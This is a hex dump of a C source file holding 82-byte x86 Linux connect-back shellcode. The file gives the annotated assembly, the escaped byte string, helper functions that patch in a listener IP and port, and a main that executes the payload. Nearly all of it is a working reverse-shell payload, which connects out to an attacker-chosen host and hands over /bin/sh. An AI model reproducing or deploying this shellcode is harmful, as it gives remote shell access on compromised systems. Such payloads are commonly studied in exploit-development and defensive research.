00000000  2f 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |/*--------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000040  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2a 0d 0a  |-------------*..|
00000050  20 2a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | *              |
00000060  20 20 20 38 32 20 62 79  74 65 20 43 6f 6e 6e 65  |   82 byte Conne|
00000070  63 74 62 61 63 6b 20 73  68 65 6c 6c 63 6f 64 65  |ctback shellcode|
00000080  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000090  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000000a0  20 2a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | *              |
000000b0  62 79 20 42 65 6e 6a 61  6d 69 6e 20 4f 72 6f 7a  |by Benjamin Oroz|
000000c0  63 6f 20 2d 20 62 65 6e  6f 72 6f 72 40 67 6d 61  |co - benoror@gma|
000000d0  69 6c 2e 63 6f 6d 20 20  20 20 20 20 20 20 20 20  |il.com          |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000000f0  20 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | *--------------|
00000100  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000130  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2a 0d 0a  |-------------*..|
00000140  20 2a 20 20 20 20 66 69  6c 65 6e 61 6d 65 3a 20  | *    filename: |
00000150  78 38 36 2d 6c 69 6e 75  78 2d 63 6f 6e 6e 65 63  |x86-linux-connec|
00000160  74 62 61 63 6b 2e 63 20  20 20 20 20 20 20 20 20  |tback.c         |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
00000190  20 2a 20 64 69 73 63 72  69 70 74 69 6f 6e 3a 20  | * discription: |
000001a0  78 38 36 2d 6c 69 6e 75  78 20 63 6f 6e 6e 65 63  |x86-linux connec|
000001b0  74 20 62 61 63 6b 20 73  68 65 6c 6c 63 6f 64 65  |t back shellcode|
000001c0  2e 20 55 73 65 20 53 45  54 5f 50 4f 52 54 28 29  |. Use SET_PORT()|
000001d0  20 61 6e 64 09 20 20 20  20 20 2a 0d 0a 20 2a 09  | and.     *.. *.|
000001e0  09 53 45 54 5f 49 50 28  29 20 62 65 66 6f 72 65  |.SET_IP() before|
000001f0  20 75 73 69 6e 67 20 74  68 65 20 73 68 65 6c 6c  | using the shell|
00000200  63 6f 64 65 2e 20 45 78  61 6d 70 6c 65 3a 20 20  |code. Example:  |
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 0d  |              *.|
00000220  0a 20 2a 09 09 09 09 09  09 09 09 09 20 20 20 20  |. *.........    |
00000230  20 2a 0d 0a 20 2a 09 09  09 53 45 54 5f 49 50 28  | *.. *...SET_IP(|
00000240  73 63 2c 20 22 31 39 32  2e 31 36 38 2e 31 33 2e  |sc, "192.168.13.|
00000250  32 32 22 29 3b 09 09 09  20 20 20 20 20 2a 0d 0a  |22");...     *..|
00000260  20 2a 09 09 09 53 45 54  5f 50 4f 52 54 28 73 63  | *...SET_PORT(sc|
00000270  2c 20 33 31 33 33 37 29  3b 09 09 09 09 20 20 20  |, 31337);....   |
00000280  20 20 2a 0d 0a 20 2a 09  09 09 09 09 09 09 09 09  |  *.. *.........|
00000290  20 20 20 20 20 2a 0d 0a  20 2a 5f 5f 5f 5f 5f 5f  |     *.. *______|
000002a0  5f 5f 5f 5f 5f 5f 5f 5f  5f 5f 5f 5f 5f 5f 5f 5f  |________________|
*
000002e0  5f 5f 5f 5f 5f 2a 0d 0a  20 2a 2d 2d 2d 2d 2d 2d  |_____*.. *------|
000002f0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000330  2d 2d 2d 2d 2d 2a 2f 0d  0a 0d 0a 2f 2a 2d 2d 2d  |-----*/..../*---|
00000340  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000380  2d 2d 2d 2d 2d 2d 2d 2d  2a 0d 0a 20 2a 09 09 09  |--------*.. *...|
00000390  09 41 53 4d 20 43 6f 64  65 09 09 09 09 20 20 20  |.ASM Code....   |
000003a0  20 20 2a 0d 0a 20 2a 2d  2d 2d 2d 2d 2d 2d 2d 2d  |  *.. *---------|
000003b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000003f0  2d 2d 2a 0d 0a 0d 0a 23  20 73 20 3d 20 73 6f 63  |--*....# s = soc|
00000400  6b 65 74 28 32 2c 20 31  2c 20 30 29 0d 0a 70 75  |ket(2, 1, 0)..pu|
00000410  73 68 20 20 20 24 30 78  36 36 09 09 09 23 0d 0a  |sh   $0x66...#..|
00000420  70 6f 70 20 20 20 20 25  65 61 78 09 09 09 23 20  |pop    %eax...# |
00000430  30 78 36 36 20 3d 20 73  6f 63 6b 65 74 63 61 6c  |0x66 = socketcal|
00000440  6c 0d 0a 70 75 73 68 20  20 20 24 30 78 31 09 09  |l..push   $0x1..|
00000450  09 23 0d 0a 70 6f 70 20  20 20 20 25 65 62 78 09  |.#..pop    %ebx.|
00000460  09 09 23 20 73 6f 63 6b  65 74 28 29 20 3d 20 31  |..# socket() = 1|
00000470  0d 0a 78 6f 72 20 20 20  20 25 65 63 78 2c 25 65  |..xor    %ecx,%e|
00000480  63 78 09 09 23 0d 0a 70  75 73 68 20 20 20 25 65  |cx..#..push   %e|
00000490  63 78 09 09 09 23 20 30  0d 0a 70 75 73 68 20 20  |cx...# 0..push  |
000004a0  20 24 30 78 31 09 09 09  23 20 53 4f 43 4b 5f 53  | $0x1...# SOCK_S|
000004b0  54 52 45 41 4d 20 3d 20  31 0d 0a 70 75 73 68 20  |TREAM = 1..push |
000004c0  20 20 24 30 78 32 09 09  09 23 20 41 46 5f 49 4e  |  $0x2...# AF_IN|
000004d0  45 54 20 3d 20 32 0d 0a  6d 6f 76 20 20 20 20 25  |ET = 2..mov    %|
000004e0  65 73 70 2c 25 65 63 78  09 09 23 20 41 72 67 75  |esp,%ecx..# Argu|
000004f0  6d 65 6e 74 73 0d 0a 69  6e 74 20 20 20 20 24 30  |ments..int    $0|
00000500  78 38 30 09 09 09 23 20  45 58 45 43 55 54 45 20  |x80...# EXECUTE |
00000510  2d 20 4e 6f 77 20 25 65  61 78 20 68 61 76 65 20  |- Now %eax have |
00000520  74 68 65 20 73 20 66 69  6c 65 44 65 73 63 72 69  |the s fileDescri|
00000530  70 74 6f 72 0d 0a 0d 0a  23 20 63 6f 6e 6e 65 63  |ptor....# connec|
00000540  74 28 73 2c 20 5b 32 2c  20 36 34 37 31 33 2c 20  |t(s, [2, 64713, |
00000550  31 32 37 2e 31 32 37 2e  31 32 37 5d 2c 20 30 78  |127.127.127], 0x|
00000560  31 30 29 0d 0a 70 75 73  68 20 20 20 24 30 78 37  |10)..push   $0x7|
00000570  66 37 66 37 66 37 66 09  09 23 20 31 32 37 2e 31  |f7f7f7f..# 127.1|
00000580  32 37 2e 31 32 37 20 3d  20 30 78 37 66 37 66 37  |27.127 = 0x7f7f7|
00000590  66 37 66 0d 0a 70 75 73  68 77 20 20 24 30 78 63  |f7f..pushw  $0xc|
000005a0  39 66 63 09 09 09 23 20  50 4f 52 54 20 3d 20 36  |9fc...# PORT = 6|
000005b0  34 37 31 33 0d 0a 70 75  73 68 77 20 20 24 30 78  |4713..pushw  $0x|
000005c0  32 09 09 09 23 20 41 46  5f 49 4e 45 54 20 3d 20  |2...# AF_INET = |
000005d0  32 0d 0a 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |2..mov    %esp,%|
000005e0  65 63 78 09 09 23 20 25  65 63 78 20 68 6f 6c 64  |ecx..# %ecx hold|
000005f0  73 20 73 65 72 76 65 72  20 73 74 72 75 63 74 0d  |s server struct.|
00000600  0a 70 75 73 68 20 20 20  24 30 78 31 30 09 09 09  |.push   $0x10...|
00000610  23 20 73 69 7a 65 6f 66  28 73 65 72 76 65 72 29  |# sizeof(server)|
00000620  20 3d 20 31 30 0d 0a 70  75 73 68 20 20 20 25 65  | = 10..push   %e|
00000630  63 78 09 09 09 23 20 73  65 72 76 65 72 20 73 74  |cx...# server st|
00000640  72 75 63 74 0d 0a 70 75  73 68 20 20 20 25 65 61  |ruct..push   %ea|
00000650  78 09 09 09 23 20 73 20  66 69 6c 65 44 65 73 63  |x...# s fileDesc|
00000660  72 69 70 74 6f 72 0d 0a  6d 6f 76 20 20 20 20 25  |riptor..mov    %|
00000670  65 73 70 2c 25 65 63 78  0d 0a 6d 6f 76 20 20 20  |esp,%ecx..mov   |
00000680  20 25 65 61 78 2c 25 65  73 69 09 09 23 20 6e 6f  | %eax,%esi..# no|
00000690  77 20 25 65 73 69 20 68  6f 6c 64 73 20 73 20 66  |w %esi holds s f|
000006a0  69 6c 65 44 65 73 63 72  69 70 74 6f 72 20 5b 66  |ileDescriptor [f|
000006b0  6f 72 20 63 6f 6e 6e 65  63 74 28 29 5d 0d 0a 70  |or connect()]..p|
000006c0  75 73 68 20 20 20 24 30  78 33 09 09 09 23 0d 0a  |ush   $0x3...#..|
000006d0  70 6f 70 20 20 20 20 25  65 62 78 09 09 09 23 20  |pop    %ebx...# |
000006e0  63 6f 6e 6e 65 63 74 28  29 20 3d 20 33 0d 0a 70  |connect() = 3..p|
000006f0  75 73 68 20 20 20 24 30  78 36 36 09 09 09 23 0d  |ush   $0x66...#.|
00000700  0a 70 6f 70 20 20 20 20  25 65 61 78 09 09 09 23  |.pop    %eax...#|
00000710  20 30 78 36 36 20 3d 20  73 6f 63 6b 65 74 63 61  | 0x66 = socketca|
00000720  6c 6c 0d 0a 69 6e 74 20  20 20 20 24 30 78 38 30  |ll..int    $0x80|
00000730  09 09 09 23 20 4f 6e 20  73 75 63 63 65 73 73 20  |...# On success |
00000740  25 65 61 78 20 3d 20 30  0d 0a 0d 0a 23 20 64 75  |%eax = 0....# du|
00000750  70 32 28 73 2c 20 32 29  20 2c 20 64 75 70 32 28  |p2(s, 2) , dup2(|
00000760  73 2c 20 31 29 20 2c 20  64 75 70 32 28 73 2c 20  |s, 1) , dup2(s, |
00000770  30 29 0d 0a 78 63 68 67  20 20 20 25 65 73 69 2c  |0)..xchg   %esi,|
00000780  25 65 62 78 20 20 20 20  20 20 20 20 09 23 20 50  |%ebx        .# P|
00000790  75 74 20 73 20 66 69 6c  65 44 65 73 63 72 69 70  |ut s fileDescrip|
000007a0  74 6f 72 20 6f 6e 20 25  65 62 78 20 5b 66 6f 72  |tor on %ebx [for|
000007b0  20 64 75 70 32 28 29 5d  0d 0a 70 75 73 68 20 20  | dup2()]..push  |
000007c0  20 24 30 78 32 0d 0a 70  6f 70 20 20 20 20 25 65  | $0x2..pop    %e|
000007d0  63 78 0d 0a 64 75 70 5f  6c 6f 6f 70 3a 0d 0a 6d  |cx..dup_loop:..m|
000007e0  6f 76 20 20 20 20 24 30  78 33 66 2c 25 61 6c 09  |ov    $0x3f,%al.|
000007f0  09 23 20 64 75 70 32 28  29 20 3d 20 30 78 33 66  |.# dup2() = 0x3f|
00000800  0d 0a 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |..int    $0x80..|
00000810  64 65 63 20 20 20 20 25  65 63 78 0d 0a 6a 6e 73  |dec    %ecx..jns|
00000820  20 20 20 20 64 75 70 5f  6c 6f 6f 70 0d 0a 0d 0a  |    dup_loop....|
00000830  23 20 65 78 65 63 76 65  28 22 2f 62 69 6e 2f 2f  |# execve("/bin//|
00000840  73 68 22 2c 20 5b 22 2f  62 69 6e 2f 2f 73 68 22  |sh", ["/bin//sh"|
00000850  2c 4e 55 4c 4c 5d 29 0d  0a 6d 6f 76 20 20 20 20  |,NULL])..mov    |
00000860  24 30 78 62 2c 25 61 6c  09 09 09 23 20 65 78 65  |$0xb,%al...# exe|
00000870  63 76 65 20 3d 20 31 31  64 0d 0a 78 6f 72 20 20  |cve = 11d..xor  |
00000880  20 20 25 65 64 78 2c 25  65 64 78 0d 0a 70 75 73  |  %edx,%edx..pus|
00000890  68 20 20 20 25 65 64 78  0d 0a 70 75 73 68 20 20  |h   %edx..push  |
000008a0  20 24 30 78 36 38 37 33  32 66 32 66 0d 0a 70 75  | $0x68732f2f..pu|
000008b0  73 68 20 20 20 24 30 78  36 65 36 39 36 32 32 66  |sh   $0x6e69622f|
000008c0  0d 0a 6d 6f 76 20 20 20  20 25 65 73 70 2c 25 65  |..mov    %esp,%e|
000008d0  62 78 0d 0a 70 75 73 68  20 20 20 25 65 64 78 0d  |bx..push   %edx.|
000008e0  0a 70 75 73 68 20 20 20  25 65 62 78 0d 0a 6d 6f  |.push   %ebx..mo|
000008f0  76 20 20 20 20 25 65 73  70 2c 20 25 65 63 78 0d  |v    %esp, %ecx.|
00000900  0a 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 0d  |.int    $0x80...|
00000910  0a 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |.*--------------|
00000920  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000950  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2a 2f  |--------------*/|
00000960  0d 0a 0d 0a 63 68 61 72  20 73 63 5b 5d 20 3d 0d  |....char sc[] =.|
00000970  0a 22 5c 78 36 61 5c 78  36 36 22 20 20 20 20 20  |."\x6a\x66"     |
00000980  20 20 20 20 20 20 20 20  20 20 20 09 09 2f 2f 70  |           ..//p|
00000990  75 73 68 20 20 20 24 30  78 36 36 0d 0a 22 5c 78  |ush   $0x66.."\x|
000009a0  35 38 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |58"             |
000009b0  20 20 20 20 20 20 09 09  2f 2f 70 6f 70 20 20 20  |      ..//pop   |
000009c0  20 25 65 61 78 0d 0a 22  5c 78 36 61 5c 78 30 31  | %eax.."\x6a\x01|
000009d0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000009e0  20 09 09 2f 2f 70 75 73  68 20 20 20 24 30 78 31  | ..//push   $0x1|
000009f0  0d 0a 22 5c 78 35 62 22  20 20 20 20 20 20 20 20  |.."\x5b"        |
00000a00  20 20 20 20 20 20 20 20  20 20 20 09 09 2f 2f 70  |           ..//p|
00000a10  6f 70 20 20 20 20 25 65  62 78 0d 0a 22 5c 78 33  |op    %ebx.."\x3|
00000a20  31 5c 78 63 39 22 20 20  20 20 20 20 20 20 20 20  |1\xc9"          |
00000a30  20 20 20 20 20 20 09 09  2f 2f 78 6f 72 20 20 20  |      ..//xor   |
00000a40  20 25 65 63 78 2c 25 65  63 78 0d 0a 22 5c 78 35  | %ecx,%ecx.."\x5|
00000a50  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000a60  20 20 20 20 20 09 09 2f  2f 70 75 73 68 20 20 20  |     ..//push   |
00000a70  25 65 63 78 0d 0a 22 5c  78 36 61 5c 78 30 31 22  |%ecx.."\x6a\x01"|
00000a80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a90  09 09 2f 2f 70 75 73 68  20 20 20 24 30 78 31 0d  |..//push   $0x1.|
00000aa0  0a 22 5c 78 36 61 5c 78  30 32 22 20 20 20 20 20  |."\x6a\x02"     |
00000ab0  20 20 20 20 20 20 20 20  20 20 20 09 09 2f 2f 70  |           ..//p|
00000ac0  75 73 68 20 20 20 24 30  78 32 0d 0a 22 5c 78 38  |ush   $0x2.."\x8|
00000ad0  39 5c 78 65 31 22 20 20  20 20 20 20 20 20 20 20  |9\xe1"          |
00000ae0  20 20 20 20 20 20 09 09  2f 2f 6d 6f 76 20 20 20  |      ..//mov   |
00000af0  20 25 65 73 70 2c 25 65  63 78 0d 0a 22 5c 78 63  | %esp,%ecx.."\xc|
00000b00  64 5c 78 38 30 22 20 20  20 20 20 20 20 20 20 20  |d\x80"          |
00000b10  20 20 20 20 20 20 09 09  2f 2f 69 6e 74 20 20 20  |      ..//int   |
00000b20  20 24 30 78 38 30 0d 0a  22 5c 78 36 38 5c 78 37  | $0x80.."\x68\x7|
00000b30  66 5c 78 37 66 5c 78 37  66 5c 78 37 66 22 20 20  |f\x7f\x7f\x7f"  |
00000b40  20 20 20 20 20 09 09 2f  2f 70 75 73 68 20 20 20  |     ..//push   |
00000b50  24 30 78 37 66 37 66 37  66 37 66 09 2f 2f 49 50  |$0x7f7f7f7f.//IP|
00000b60  0d 0a 22 5c 78 36 36 5c  78 36 38 5c 78 66 63 5c  |.."\x66\x68\xfc\|
00000b70  78 63 39 22 20 20 20 20  20 20 20 20 20 20 09 09  |xc9"          ..|
00000b80  2f 2f 70 75 73 68 77 20  20 24 30 78 63 39 66 63  |//pushw  $0xc9fc|
00000b90  09 2f 2f 50 4f 52 54 0d  0a 22 5c 78 36 36 5c 78  |.//PORT.."\x66\x|
00000ba0  36 61 5c 78 30 32 22 20  20 20 20 20 20 20 20 20  |6a\x02"         |
00000bb0  20 20 20 20 09 09 2f 2f  70 75 73 68 77 20 20 24  |    ..//pushw  $|
00000bc0  30 78 32 0d 0a 22 5c 78  38 39 5c 78 65 31 22 20  |0x2.."\x89\xe1" |
00000bd0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000be0  09 2f 2f 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |.//mov    %esp,%|
00000bf0  65 63 78 0d 0a 22 5c 78  36 61 5c 78 31 30 22 20  |ecx.."\x6a\x10" |
00000c00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000c10  09 2f 2f 70 75 73 68 20  20 20 24 30 78 31 30 0d  |.//push   $0x10.|
00000c20  0a 22 5c 78 35 31 22 20  20 20 20 20 20 20 20 20  |."\x51"         |
00000c30  20 20 20 20 20 20 20 20  20 20 09 09 2f 2f 70 75  |          ..//pu|
00000c40  73 68 20 20 20 25 65 63  78 0d 0a 22 5c 78 35 30  |sh   %ecx.."\x50|
00000c50  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000c60  20 20 20 20 09 09 2f 2f  70 75 73 68 20 20 20 25  |    ..//push   %|
00000c70  65 61 78 0d 0a 22 5c 78  38 39 5c 78 65 31 22 20  |eax.."\x89\xe1" |
00000c80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000c90  09 2f 2f 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |.//mov    %esp,%|
00000ca0  65 63 78 0d 0a 22 5c 78  38 39 5c 78 63 36 22 20  |ecx.."\x89\xc6" |
00000cb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000cc0  09 2f 2f 6d 6f 76 20 20  20 20 25 65 61 78 2c 25  |.//mov    %eax,%|
00000cd0  65 73 69 0d 0a 22 5c 78  36 61 5c 78 30 33 22 20  |esi.."\x6a\x03" |
00000ce0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000cf0  09 2f 2f 70 75 73 68 20  20 20 24 30 78 33 0d 0a  |.//push   $0x3..|
00000d00  22 5c 78 35 62 22 20 20  20 20 20 20 20 20 20 20  |"\x5b"          |
00000d10  20 20 20 20 20 20 20 20  20 09 09 2f 2f 70 6f 70  |         ..//pop|
00000d20  20 20 20 20 25 65 62 78  0d 0a 22 5c 78 36 61 5c  |    %ebx.."\x6a\|
00000d30  78 36 36 22 20 20 20 20  20 20 20 20 20 20 20 20  |x66"            |
00000d40  20 20 20 20 09 09 2f 2f  70 75 73 68 20 20 20 24  |    ..//push   $|
00000d50  30 78 36 36 0d 0a 22 5c  78 35 38 22 20 20 20 20  |0x66.."\x58"    |
00000d60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000d70  09 2f 2f 70 6f 70 20 20  20 20 25 65 61 78 0d 0a  |.//pop    %eax..|
00000d80  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
00000d90  20 20 20 20 20 20 20 20  20 20 09 09 2f 2f 69 6e  |          ..//in|
00000da0  74 20 20 20 20 24 30 78  38 30 0d 0a 22 5c 78 38  |t    $0x80.."\x8|
00000db0  37 5c 78 66 33 22 20 20  20 20 20 20 20 20 20 20  |7\xf3"          |
00000dc0  20 20 20 20 20 20 09 09  2f 2f 78 63 68 67 20 20  |      ..//xchg  |
00000dd0  20 25 65 73 69 2c 25 65  62 78 0d 0a 22 5c 78 36  | %esi,%ebx.."\x6|
00000de0  61 5c 78 30 32 22 20 20  20 20 20 20 20 20 20 20  |a\x02"          |
00000df0  20 20 20 20 20 20 09 09  2f 2f 70 75 73 68 20 20  |      ..//push  |
00000e00  20 24 30 78 32 0d 0a 22  5c 78 35 39 22 20 20 20  | $0x2.."\x59"   |
00000e10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e20  09 09 2f 2f 70 6f 70 20  20 20 20 25 65 63 78 0d  |..//pop    %ecx.|
00000e30  0a 22 5c 78 62 30 5c 78  33 66 22 20 20 20 20 20  |."\xb0\x3f"     |
00000e40  20 20 20 20 20 20 20 20  20 20 20 09 09 2f 2f 6d  |           ..//m|
00000e50  6f 76 20 20 20 20 24 30  78 33 66 2c 25 61 6c 0d  |ov    $0x3f,%al.|
00000e60  0a 22 5c 78 63 64 5c 78  38 30 22 20 20 20 20 20  |."\xcd\x80"     |
00000e70  20 20 20 20 20 20 20 20  20 20 09 09 2f 2f 69 6e  |          ..//in|
00000e80  74 20 20 20 20 24 30 78  38 30 0d 0a 22 5c 78 34  |t    $0x80.."\x4|
00000e90  39 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |9"              |
00000ea0  20 20 20 20 20 09 09 2f  2f 64 65 63 20 20 20 20  |     ..//dec    |
00000eb0  25 65 63 78 0d 0a 22 5c  78 37 39 5c 78 66 39 22  |%ecx.."\x79\xf9"|
00000ec0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ed0  09 09 2f 2f 6a 6e 73 20  20 20 20 33 34 20 3c 64  |..//jns    34 <d|
00000ee0  75 70 5f 6c 6f 6f 70 3e  0d 0a 22 5c 78 62 30 5c  |up_loop>.."\xb0\|
00000ef0  78 30 62 22 20 20 20 20  20 20 20 20 20 20 20 20  |x0b"            |
00000f00  20 20 20 20 09 09 2f 2f  6d 6f 76 20 20 20 20 24  |    ..//mov    $|
00000f10  30 78 62 2c 25 61 6c 0d  0a 22 5c 78 33 31 5c 78  |0xb,%al.."\x31\x|
00000f20  64 32 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |d2"             |
00000f30  20 20 20 09 09 2f 2f 78  6f 72 20 20 20 20 25 65  |   ..//xor    %e|
00000f40  64 78 2c 25 65 64 78 0d  0a 22 5c 78 35 32 22 20  |dx,%edx.."\x52" |
00000f50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000f60  20 20 09 09 2f 2f 70 75  73 68 20 20 20 25 65 64  |  ..//push   %ed|
00000f70  78 0d 0a 22 5c 78 36 38  5c 78 32 66 5c 78 32 66  |x.."\x68\x2f\x2f|
00000f80  5c 78 37 33 5c 78 36 38  22 20 20 20 20 20 20 20  |\x73\x68"       |
00000f90  09 09 2f 2f 70 75 73 68  20 20 20 24 30 78 36 38  |..//push   $0x68|
00000fa0  37 33 32 66 32 66 0d 0a  22 5c 78 36 38 5c 78 32  |732f2f.."\x68\x2|
00000fb0  66 5c 78 36 32 5c 78 36  39 5c 78 36 65 22 20 20  |f\x62\x69\x6e"  |
00000fc0  20 20 20 20 20 09 09 2f  2f 70 75 73 68 20 20 20  |     ..//push   |
00000fd0  24 30 78 36 65 36 39 36  32 32 66 0d 0a 22 5c 78  |$0x6e69622f.."\x|
00000fe0  38 39 5c 78 65 33 22 20  20 20 20 20 20 20 20 20  |89\xe3"         |
00000ff0  20 20 20 20 20 20 20 09  09 2f 2f 6d 6f 76 20 20  |       ..//mov  |
00001000  20 20 25 65 73 70 2c 25  65 62 78 0d 0a 22 5c 78  |  %esp,%ebx.."\x|
00001010  35 32 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |52"             |
00001020  20 20 20 20 20 20 09 09  2f 2f 70 75 73 68 20 20  |      ..//push  |
00001030  20 25 65 64 78 0d 0a 22  5c 78 35 33 22 20 20 20  | %edx.."\x53"   |
00001040  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001050  09 09 2f 2f 70 75 73 68  20 20 20 25 65 62 78 0d  |..//push   %ebx.|
00001060  0a 22 5c 78 38 39 5c 78  65 31 22 20 20 20 20 20  |."\x89\xe1"     |
00001070  20 20 20 20 20 20 20 20  20 20 20 09 09 2f 2f 6d  |           ..//m|
00001080  6f 76 20 20 20 20 25 65  73 70 2c 25 65 63 78 0d  |ov    %esp,%ecx.|
00001090  0a 22 5c 78 63 64 5c 78  38 30 22 3b 20 20 20 20  |."\xcd\x80";    |
000010a0  20 20 20 20 20 20 20 20  20 20 20 09 09 2f 2f 69  |           ..//i|
000010b0  6e 74 20 20 20 20 24 30  78 38 30 0d 0a 0d 0a 76  |nt    $0x80....v|
000010c0  6f 69 64 20 53 45 54 5f  50 4f 52 54 28 63 68 61  |oid SET_PORT(cha|
000010d0  72 20 2a 62 75 66 2c 20  69 6e 74 20 70 6f 72 74  |r *buf, int port|
000010e0  29 20 7b 0d 0a 09 2a 28  75 6e 73 69 67 6e 65 64  |) {...*(unsigned|
000010f0  20 73 68 6f 72 74 20 2a  29 28 28 28 62 75 66 29  | short *)(((buf)|
00001100  2b 32 34 29 29 20 3d 20  28 70 6f 72 74 29 3b 0d  |+24)) = (port);.|
00001110  0a 09 63 68 61 72 20 74  6d 70 20 3d 20 62 75 66  |..char tmp = buf|
00001120  5b 32 34 5d 3b 0d 0a 09  62 75 66 5b 32 34 5d 20  |[24];...buf[24] |
00001130  3d 20 62 75 66 5b 32 35  5d 3b 0d 0a 09 62 75 66  |= buf[25];...buf|
00001140  5b 32 35 5d 20 3d 20 74  6d 70 3b 0d 0a 7d 0d 0a  |[25] = tmp;..}..|
00001150  0d 0a 76 6f 69 64 20 53  45 54 5f 49 50 28 63 68  |..void SET_IP(ch|
00001160  61 72 20 2a 62 75 66 2c  20 63 68 61 72 20 2a 69  |ar *buf, char *i|
00001170  70 29 20 7b 0d 0a 09 75  6e 73 69 67 6e 65 64 20  |p) {...unsigned |
00001180  6c 6f 6e 67 20 62 61 63  6b 69 70 20 3d 20 69 6e  |long backip = in|
00001190  65 74 5f 61 64 64 72 28  69 70 29 3b 0d 0a 09 2a  |et_addr(ip);...*|
000011a0  28 75 6e 73 69 67 6e 65  64 20 6c 6f 6e 67 20 2a  |(unsigned long *|
000011b0  29 28 28 28 62 75 66 29  2b 31 38 29 29 20 3d 20  |)(((buf)+18)) = |
000011c0  28 62 61 63 6b 69 70 29  3b 0d 0a 7d 0d 0a 0d 0a  |(backip);..}....|
000011d0  6d 61 69 6e 28 29 7b 0d  0a 09 70 72 69 6e 74 66  |main(){...printf|
000011e0  28 22 73 69 7a 65 3a 20  25 64 20 62 79 74 65 73  |("size: %d bytes|
000011f0  5c 6e 22 2c 20 73 74 72  6c 65 6e 28 73 63 29 29  |\n", strlen(sc))|
00001200  3b 0d 0a 0d 0a 09 53 45  54 5f 50 4f 52 54 28 73  |;.....SET_PORT(s|
00001210  63 2c 20 33 33 33 33 33  29 3b 0d 0a 09 53 45 54  |c, 33333);...SET|
00001220  5f 49 50 28 73 63 2c 20  22 31 32 37 2e 30 2e 30  |_IP(sc, "127.0.0|
00001230  2e 31 22 29 3b 0d 0a 09  5f 5f 61 73 6d 5f 5f 28  |.1");...__asm__(|
00001240  22 63 61 6c 6c 20 73 63  22 29 3b 0d 0a 7d        |"call sc");..}|
0000124e
